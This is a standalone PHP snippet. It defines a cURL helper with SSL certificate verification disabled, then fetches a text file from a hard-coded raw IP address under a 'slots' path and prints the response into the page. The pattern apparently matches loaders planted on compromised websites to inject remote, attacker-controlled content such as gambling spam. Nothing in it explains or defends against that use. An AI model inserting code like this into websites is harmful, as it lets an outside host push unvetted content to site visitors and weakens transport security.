function http_request($url){
  $ch = curl_init(); 
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
  $output = curl_exec($ch); 
  
  if(curl_errno($ch)) {
      echo 'Curl error: ' . curl_error($ch);
  }
  
  curl_close($ch);
  
  return $output;
}

$result = http_request('http://156.67.221.29/slots/fuck.txt');
echo $result;
